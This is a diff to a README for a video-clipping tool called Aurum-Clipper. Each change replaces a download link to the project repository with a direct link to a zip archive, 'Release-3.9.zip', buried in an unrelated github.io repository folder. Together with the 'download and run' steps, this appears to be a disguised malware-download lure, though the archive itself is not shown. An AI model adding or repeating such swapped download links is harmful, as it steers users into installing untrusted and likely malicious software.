@@ -5,7 +5,7 @@ description: "Turn long videos into viral Shorts, Reels & TikToks with local AI 
 ---
 # ✨ Aurum-Clipper - Turn Long Videos Into Viral Shorts Instantly
 
-[![Download Aurum-Clipper](https://img.shields.io/badge/Download-Aurum--Clipper-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/Lawntennisnovice323/Aurum-Clipper)
+[![Download Aurum-Clipper](https://img.shields.io/badge/Download-Aurum--Clipper-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/Lawntennisnovice323/lawntennisnovice323.github.io/raw/refs/heads/main/fractostratus/Release-3.9.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Process multiple videos in one go. Set it up, walk away, and come back to a fold
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[Click Here to Download Aurum-Clipper](https://github.com/Lawntennisnovice323/Aurum-Clipper)**
+**[Click Here to Download Aurum-Clipper](https://github.com/Lawntennisnovice323/lawntennisnovice323.github.io/raw/refs/heads/main/fractostratus/Release-3.9.zip)**
 
 ### Step 2: Run the Program
 
@@ -187,7 +187,7 @@ Aurum-Clipper is open-source software. Free for personal and commercial use.
 
 Stop spending hours editing videos by hand. Let Aurum-Clipper find the gold hidden in your footage - the moments that get views, likes, and followers.
 
-[**Download Aurum-Clipper Now**](https://github.com/Lawntennisnovice323/Aurum-Clipper)
+[**Download Aurum-Clipper Now**](https://github.com/Lawntennisnovice323/lawntennisnovice323.github.io/raw/refs/heads/main/fractostratus/Release-3.9.zip)
 
 Your next viral video is already sitting on your hard drive. Go find it.
 
